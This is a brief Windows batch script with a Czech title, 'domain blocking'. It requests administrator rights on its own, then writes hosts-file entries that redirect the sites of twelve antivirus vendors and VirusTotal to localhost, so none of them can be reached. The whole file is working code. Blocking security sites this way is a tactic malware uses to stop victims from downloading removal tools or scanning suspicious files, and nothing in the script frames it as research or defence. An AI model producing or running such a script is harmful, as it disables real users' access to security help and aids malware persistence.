@echo off
title Blokovani domen

rem Žádost o oprávnění správce
net session & cls
if %errorlevel% neq 0 powershell /c "Start-Process -Verb RunAs -FilePath '%0'" & exit

cd /d %windir%\System32\drivers\etc
echo 127.0.0.1 www.avast.com>>hosts
echo 127.0.0.1 www.avg.com>>hosts
echo 127.0.0.1 www.malwarebytes.com>>hosts
echo 127.0.0.1 www.norton.com>>hosts
echo 127.0.0.1 www.eset.com>>hosts
echo 127.0.0.1 www.bitdefender.com>>hosts
echo 127.0.0.1 www.avira.com>>hosts
echo 127.0.0.1 www.comodo.com>>hosts
echo 127.0.0.1 www.kaspersky.com>>hosts
echo 127.0.0.1 www.sophos.com>>hosts
echo 127.0.0.1 www.mcafee.com>>hosts
echo 127.0.0.1 www.virustotal.com>>hosts

exit 0